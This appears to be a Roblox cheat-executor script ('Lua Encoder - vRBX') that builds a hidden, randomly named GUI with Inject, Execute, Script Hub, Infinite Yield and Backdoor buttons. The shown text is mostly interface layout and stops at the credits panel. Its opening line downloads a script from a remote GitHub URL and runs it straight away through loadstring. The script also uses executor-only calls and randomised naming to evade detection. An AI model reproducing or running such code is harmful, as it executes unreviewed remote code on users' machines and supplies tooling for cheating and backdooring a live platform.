-- Lua

loadstring(game:HttpGet("https://raw.githubusercontent.com/nseinkkk/LuaEncoder/main/UNCChecker.lua"))()

if _G.LuaEncoderLoaded == true then
	-- warn("Gui Already Loaded")
	return
else
	_G.LuaEncoderLoaded = true
end

alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
allnumbers = {'1', '2', '3', '4', '5', '6','7','8','9','0'}

function GenerateName(lenght)

	local rand = math.random(1,2)

	local text=''

	for i=1,lenght do
		if rand == 1 then
			text=text..alphabet[math.random(1,#alphabet)]
			rand = math.random(1,2)
		elseif rand == 2 then
			text=text..allnumbers[math.random(1,#allnumbers)]
			rand = math.random(1,2)
		end

	end

	return text

end

local namesetforgui = GenerateName(math.random(500, 1000))

-- Instances: 232 | Scripts: 18 | Modules: 7
local G2L = {};

-- StarterGui.LuaEncoderPC
G2L["1"] = Instance.new("ScreenGui", gethui());
G2L["1"]["Name"] = namesetforgui;
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;

-- StarterGui.LuaEncoderPC.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Visible"] = false;
G2L["2"]["ZIndex"] = 999999999;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["2"]["Size"] = UDim2.new(0.5347, 0, 0.44798, 0);
G2L["2"]["Position"] = UDim2.new(0.01569, 0, 0.02972, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);

-- StarterGui.LuaEncoderPC.Frame.ImageLabel
G2L["3"] = Instance.new("ImageLabel", G2L["2"]);
G2L["3"]["ZIndex"] = 999999999;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["SelectionOrder"] = 6;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["Image"] = [[rbxassetid://17546664635]];
G2L["3"]["Size"] = UDim2.new(0.10276, 0, 0.15285, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["BackgroundTransparency"] = 1;
G2L["3"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.Frame.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4"]["Thickness"] = 3;
G2L["4"]["Color"] = Color3.fromRGB(79, 12, 101);

-- StarterGui.LuaEncoderPC.Frame.Execute
G2L["5"] = Instance.new("TextButton", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 14;
G2L["5"]["SelectionOrder"] = 6;
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["ZIndex"] = 999999999;
G2L["5"]["Size"] = UDim2.new(0.179, 0, 0.14112, 0);
G2L["5"]["Name"] = [[Execute]];
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Execute]];
G2L["5"]["Position"] = UDim2.new(0.03038, 0, 0.81361, 0);

-- StarterGui.LuaEncoderPC.Frame.Execute.UIStroke
G2L["6"] = Instance.new("UIStroke", G2L["5"]);
G2L["6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Execute.UICorner
G2L["7"] = Instance.new("UICorner", G2L["5"]);


-- StarterGui.LuaEncoderPC.Frame.Clear
G2L["8"] = Instance.new("TextButton", G2L["2"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 14;
G2L["8"]["SelectionOrder"] = 6;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["ZIndex"] = 999999999;
G2L["8"]["Size"] = UDim2.new(0.18421, 0, 0.14112, 0);
G2L["8"]["Name"] = [[Clear]];
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Clear]];
G2L["8"]["Position"] = UDim2.new(0.22479, 0, 0.81361, 0);

-- StarterGui.LuaEncoderPC.Frame.Clear.UIStroke
G2L["9"] = Instance.new("UIStroke", G2L["8"]);
G2L["9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Clear.UICorner
G2L["a"] = Instance.new("UICorner", G2L["8"]);


-- StarterGui.LuaEncoderPC.Frame.Attach
G2L["b"] = Instance.new("TextButton", G2L["2"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["SelectionOrder"] = 6;
G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["ZIndex"] = 999999999;
G2L["b"]["Size"] = UDim2.new(0.16762, 0, 0.14112, 0);
G2L["b"]["Name"] = [[Attach]];
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Inject]];
G2L["b"]["Position"] = UDim2.new(0.82991, 0, 0.81361, 0);

-- StarterGui.LuaEncoderPC.Frame.Attach.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["b"]);
G2L["c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Attach.UICorner
G2L["d"] = Instance.new("UICorner", G2L["b"]);


-- StarterGui.LuaEncoderPC.Frame.Values
G2L["e"] = Instance.new("Folder", G2L["2"]);
G2L["e"]["Name"] = [[Values]];

-- StarterGui.LuaEncoderPC.Frame.Values.Attached
G2L["f"] = Instance.new("BoolValue", G2L["e"]);
G2L["f"]["Name"] = [[Attached]];

-- StarterGui.LuaEncoderPC.Frame.Close
G2L["10"] = Instance.new("TextButton", G2L["2"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 24;
G2L["10"]["SelectionOrder"] = 6;
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["ZIndex"] = 999999999;
G2L["10"]["Size"] = UDim2.new(0.08071, 0, 0.12269, 0);
G2L["10"]["Name"] = [[Close]];
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[X]];
G2L["10"]["Position"] = UDim2.new(0.91682, 0, -0, 0);

-- StarterGui.LuaEncoderPC.Frame.Close.UIStroke
G2L["11"] = Instance.new("UIStroke", G2L["10"]);
G2L["11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["11"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Close.UICorner
G2L["12"] = Instance.new("UICorner", G2L["10"]);


-- StarterGui.LuaEncoderPC.Frame.Title
G2L["13"] = Instance.new("TextLabel", G2L["2"]);
G2L["13"]["ZIndex"] = 999999999;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["SelectionOrder"] = 6;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["TextSize"] = 14;
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["BackgroundTransparency"] = 1;
G2L["13"]["Size"] = UDim2.new(0.69278, 0, 0.15285, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Text"] = [[Lua Encoder - vRBX - v52.5]];
G2L["13"]["Name"] = [[Title]];
G2L["13"]["Position"] = UDim2.new(0.16456, 0, -0, 0);

-- StarterGui.LuaEncoderPC.Frame.Fire
G2L["14"] = Instance.new("TextButton", G2L["2"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 14;
G2L["14"]["SelectionOrder"] = 6;
G2L["14"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["ZIndex"] = 999999999;
G2L["14"]["Size"] = UDim2.new(0.17423, 0, 0.14112, 0);
G2L["14"]["Name"] = [[Fire]];
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Script Hub]];
G2L["14"]["Position"] = UDim2.new(0.62573, 0, 0.81361, 0);

-- StarterGui.LuaEncoderPC.Frame.Fire.UIStroke
G2L["15"] = Instance.new("UIStroke", G2L["14"]);
G2L["15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["15"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Fire.UICorner
G2L["16"] = Instance.new("UICorner", G2L["14"]);


-- StarterGui.LuaEncoderPC.Frame.Credits
G2L["17"] = Instance.new("TextButton", G2L["2"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 14;
G2L["17"]["SelectionOrder"] = 6;
G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["ZIndex"] = 999999999;
G2L["17"]["Size"] = UDim2.new(0.10137, 0, 0.16408, 0);
G2L["17"]["Name"] = [[Credits]];
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[Credits]];
G2L["17"]["Position"] = UDim2.new(0.88861, 0, 0.21646, 0);

-- StarterGui.LuaEncoderPC.Frame.Credits.UIStroke
G2L["18"] = Instance.new("UIStroke", G2L["17"]);
G2L["18"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["18"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Credits.UICorner
G2L["19"] = Instance.new("UICorner", G2L["17"]);


-- StarterGui.LuaEncoderPC.Frame.Main
G2L["1a"] = Instance.new("LocalScript", G2L["2"]);
G2L["1a"]["Name"] = [[Main]];

-- StarterGui.LuaEncoderPC.Frame.About
G2L["1b"] = Instance.new("TextButton", G2L["2"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["SelectionOrder"] = 6;
G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["ZIndex"] = 999999999;
G2L["1b"]["Size"] = UDim2.new(0.10137, 0, 0.15617, 0);
G2L["1b"]["Name"] = [[About]];
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[About]];
G2L["1b"]["Position"] = UDim2.new(0.88861, 0, 0.42115, 0);

-- StarterGui.LuaEncoderPC.Frame.About.UIStroke
G2L["1c"] = Instance.new("UIStroke", G2L["1b"]);
G2L["1c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1c"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.About.UICorner
G2L["1d"] = Instance.new("UICorner", G2L["1b"]);


-- StarterGui.LuaEncoderPC.Frame.Settings
G2L["1e"] = Instance.new("TextButton", G2L["2"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 14;
G2L["1e"]["SelectionOrder"] = 6;
G2L["1e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["ZIndex"] = 999999999;
G2L["1e"]["Size"] = UDim2.new(0.10137, 0, 0.15954, 0);
G2L["1e"]["Name"] = [[Settings]];
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Settings]];
G2L["1e"]["Position"] = UDim2.new(0.89059, 0, 0.60176, 0);

-- StarterGui.LuaEncoderPC.Frame.Settings.UIStroke
G2L["1f"] = Instance.new("UIStroke", G2L["1e"]);
G2L["1f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1f"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Settings.UICorner
G2L["20"] = Instance.new("UICorner", G2L["1e"]);


-- StarterGui.LuaEncoderPC.Frame.Execute2
G2L["21"] = Instance.new("TextButton", G2L["2"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextSize"] = 14;
G2L["21"]["SelectionOrder"] = 6;
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["TextScaled"] = true;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["RichText"] = true;
G2L["21"]["ZIndex"] = 999999999;
G2L["21"]["Size"] = UDim2.new(0.17656, 0, 0.14337, 0);
G2L["21"]["Name"] = [[Execute2]];
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[Execute Clipboard]];
G2L["21"]["Position"] = UDim2.new(0.42887, 0, 0.81137, 0);

-- StarterGui.LuaEncoderPC.Frame.Execute2.UIStroke
G2L["22"] = Instance.new("UIStroke", G2L["21"]);
G2L["22"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["22"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.Execute2.UICorner
G2L["23"] = Instance.new("UICorner", G2L["21"]);


-- StarterGui.LuaEncoderPC.Frame.UICorner
G2L["24"] = Instance.new("UICorner", G2L["2"]);


-- StarterGui.LuaEncoderPC.Frame.API
G2L["25"] = Instance.new("Folder", G2L["2"]);
G2L["25"]["Name"] = [[API]];

-- StarterGui.LuaEncoderPC.Frame.API.api.dll
G2L["26"] = Instance.new("ModuleScript", G2L["25"]);
G2L["26"]["Name"] = [[api.dll]];

-- StarterGui.LuaEncoderPC.Frame.API.api.dll.Module
G2L["27"] = Instance.new("ModuleScript", G2L["26"]);
G2L["27"]["Name"] = [[Module]];

-- StarterGui.LuaEncoderPC.Frame.API.api.dll.Module.Functions
G2L["28"] = Instance.new("ModuleScript", G2L["27"]);
G2L["28"]["Name"] = [[Functions]];

-- StarterGui.LuaEncoderPC.Frame.API.api.dll.Module.Functions.Injector
G2L["29"] = Instance.new("ModuleScript", G2L["28"]);
G2L["29"]["Name"] = [[Injector]];

-- StarterGui.LuaEncoderPC.Frame.API.api.dll.Module.Functions.Executor
G2L["2a"] = Instance.new("ModuleScript", G2L["28"]);
G2L["2a"]["Name"] = [[Executor]];

-- StarterGui.LuaEncoderPC.Frame.API.api.dll.Module.Functions.Clearer
G2L["2b"] = Instance.new("ModuleScript", G2L["28"]);
G2L["2b"]["Name"] = [[Clearer]];

-- StarterGui.LuaEncoderPC.Frame.vLua
G2L["2c"] = Instance.new("Folder", G2L["2"]);
G2L["2c"]["Name"] = [[vLua]];

-- StarterGui.LuaEncoderPC.Frame.vLua.Loadstring
G2L["2d"] = Instance.new("ModuleScript", G2L["2c"]);
G2L["2d"]["Name"] = [[Loadstring]];

-- StarterGui.LuaEncoderPC.Frame.ScrollingFrame
G2L["2e"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["2e"]["Active"] = true;
G2L["2e"]["ZIndex"] = 999999999;
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["CanvasSize"] = UDim2.new(2, 0, 999, 0);
G2L["2e"]["SelectionOrder"] = 6;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["Size"] = UDim2.new(0.84151, 0, 0.575, 0);
G2L["2e"]["Position"] = UDim2.new(0.03155, 0, 0.21646, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["BackgroundTransparency"] = 1;

-- StarterGui.LuaEncoderPC.Frame.ScrollingFrame.TextBox
G2L["2f"] = Instance.new("TextBox", G2L["2e"]);
G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["PlaceholderColor3"] = Color3.fromRGB(255, 0, 0);
G2L["2f"]["ZIndex"] = 999999999;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2f"]["TextWrapped"] = true;
G2L["2f"]["TextSize"] = 14;
G2L["2f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(68, 68, 68);
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f"]["RichText"] = true;
G2L["2f"]["MultiLine"] = true;
G2L["2f"]["ClearTextOnFocus"] = false;
G2L["2f"]["PlaceholderText"] = [[-- Best Executor and no key lol, Removed Syntax highlighting cus people complained]];
G2L["2f"]["Size"] = UDim2.new(3.086, 0, 3.08584, 0);
G2L["2f"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Text"] = [[print("Lua Encoder >>>>>>")]];

-- StarterGui.LuaEncoderPC.Frame.ScrollingFrame.TextBox.UICorner
G2L["30"] = Instance.new("UICorner", G2L["2f"]);


-- StarterGui.LuaEncoderPC.Frame.ScrollingFrame.UIStroke
G2L["31"] = Instance.new("UIStroke", G2L["2e"]);
G2L["31"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["31"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Frame.ScrollingFrame.UICorner
G2L["32"] = Instance.new("UICorner", G2L["2e"]);


-- StarterGui.LuaEncoderPC.Frame.ScrollingFrame.UIPadding
G2L["33"] = Instance.new("UIPadding", G2L["2e"]);
G2L["33"]["PaddingTop"] = UDim.new(0, 2);
G2L["33"]["PaddingLeft"] = UDim.new(0, 3);
G2L["33"]["PaddingBottom"] = UDim.new(0, 2);

-- StarterGui.LuaEncoderPC.Hub
G2L["34"] = Instance.new("Frame", G2L["1"]);
G2L["34"]["Visible"] = false;
G2L["34"]["ZIndex"] = 999999999;
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["34"]["Size"] = UDim2.new(0.23398, 0, 0.59825, 0);
G2L["34"]["Position"] = UDim2.new(0.75688, 0, 0.14862, 0);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Name"] = [[Hub]];

-- StarterGui.LuaEncoderPC.Hub.Title
G2L["35"] = Instance.new("TextLabel", G2L["34"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["TextSize"] = 14;
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Size"] = UDim2.new(1, 0, 0.14417, 0);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Script Hub]];
G2L["35"]["Name"] = [[Title]];
G2L["35"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.Hub.Title.UICorner
G2L["36"] = Instance.new("UICorner", G2L["35"]);


-- StarterGui.LuaEncoderPC.Hub.Title.UIStroke
G2L["37"] = Instance.new("UIStroke", G2L["35"]);
G2L["37"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Hub.Ghost
G2L["38"] = Instance.new("TextButton", G2L["34"]);
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["TextSize"] = 14;
G2L["38"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["ZIndex"] = 999999999;
G2L["38"]["Size"] = UDim2.new(0.86044, 0, 0.12872, 0);
G2L["38"]["Name"] = [[Ghost]];
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Text"] = [[Ghost Hub]];
G2L["38"]["Position"] = UDim2.new(0.0652, 0, 0.17306, 0);

-- StarterGui.LuaEncoderPC.Hub.Ghost.UIStroke
G2L["39"] = Instance.new("UIStroke", G2L["38"]);
G2L["39"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["39"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Hub.Ghost.UICorner
G2L["3a"] = Instance.new("UICorner", G2L["38"]);


-- StarterGui.LuaEncoderPC.Hub.HubMain
G2L["3b"] = Instance.new("LocalScript", G2L["34"]);
G2L["3b"]["Name"] = [[HubMain]];

-- StarterGui.LuaEncoderPC.Hub.UICorner
G2L["3c"] = Instance.new("UICorner", G2L["34"]);


-- StarterGui.LuaEncoderPC.Hub.UIStroke
G2L["3d"] = Instance.new("UIStroke", G2L["34"]);
G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Hub.DLT
G2L["3e"] = Instance.new("TextButton", G2L["34"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["ZIndex"] = 999999999;
G2L["3e"]["Size"] = UDim2.new(0.86044, 0, 0.12093, 0);
G2L["3e"]["Name"] = [[DLT]];
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[Script searcher(Paid)]];
G2L["3e"]["Position"] = UDim2.new(0.0652, 0, 0.30227, 0);

-- StarterGui.LuaEncoderPC.Hub.DLT.UIStroke
G2L["3f"] = Instance.new("UIStroke", G2L["3e"]);
G2L["3f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3f"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Hub.DLT.UICorner
G2L["40"] = Instance.new("UICorner", G2L["3e"]);


-- StarterGui.LuaEncoderPC.Hub.Cloud
G2L["41"] = Instance.new("TextButton", G2L["34"]);
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextSize"] = 14;
G2L["41"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["ZIndex"] = 999999999;
G2L["41"]["Size"] = UDim2.new(0.86044, 0, 0.12872, 0);
G2L["41"]["Name"] = [[Cloud]];
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[Cloud Script]];
G2L["41"]["Position"] = UDim2.new(0.0652, 0, 0.42238, 0);

-- StarterGui.LuaEncoderPC.Hub.Cloud.UIStroke
G2L["42"] = Instance.new("UIStroke", G2L["41"]);
G2L["42"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["42"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Hub.Cloud.UICorner
G2L["43"] = Instance.new("UICorner", G2L["41"]);


-- StarterGui.LuaEncoderPC.Hub.fe
G2L["44"] = Instance.new("TextButton", G2L["34"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["TextSize"] = 14;
G2L["44"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["ZIndex"] = 999999999;
G2L["44"]["Size"] = UDim2.new(0.86044, 0, 0.11613, 0);
G2L["44"]["Name"] = [[fe]];
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Text"] = [[FE]];
G2L["44"]["Position"] = UDim2.new(0.0652, 0, 0.55103, 0);

-- StarterGui.LuaEncoderPC.Hub.fe.UIStroke
G2L["45"] = Instance.new("UIStroke", G2L["44"]);
G2L["45"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["45"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Hub.fe.UICorner
G2L["46"] = Instance.new("UICorner", G2L["44"]);


-- StarterGui.LuaEncoderPC.Hub.fel
G2L["47"] = Instance.new("TextButton", G2L["34"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextSize"] = 14;
G2L["47"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["ZIndex"] = 999999999;
G2L["47"]["Size"] = UDim2.new(0.86044, 0, 0.14097, 0);
G2L["47"]["Name"] = [[fel]];
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[Infinite Yield]];
G2L["47"]["Position"] = UDim2.new(0.0652, 0, 0.66639, 0);

-- StarterGui.LuaEncoderPC.Hub.fel.UIStroke
G2L["48"] = Instance.new("UIStroke", G2L["47"]);
G2L["48"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["48"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Hub.fel.UICorner
G2L["49"] = Instance.new("UICorner", G2L["47"]);


-- StarterGui.LuaEncoderPC.Hub.door
G2L["4a"] = Instance.new("TextButton", G2L["34"]);
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["ZIndex"] = 999999999;
G2L["4a"]["Size"] = UDim2.new(0.86044, 0, 0.12462, 0);
G2L["4a"]["Name"] = [[door]];
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[Backdoor]];
G2L["4a"]["Position"] = UDim2.new(0.0652, 0, 0.80736, 0);

-- StarterGui.LuaEncoderPC.Hub.door.UIStroke
G2L["4b"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4b"]["Thickness"] = 2;

-- StarterGui.LuaEncoderPC.Hub.door.UICorner
G2L["4c"] = Instance.new("UICorner", G2L["4a"]);


-- StarterGui.LuaEncoderPC.Credits
G2L["4d"] = Instance.new("Frame", G2L["1"]);
G2L["4d"]["Visible"] = false;
G2L["4d"]["ZIndex"] = 999999999;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["4d"]["Size"] = UDim2.new(0.23398, 0, 0.42416, 0);
G2L["4d"]["Position"] = UDim2.new(0.6532, 0, 0.15074, 0);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Name"] = [[Credits]];

-- StarterGui.LuaEncoderPC.Credits.Title
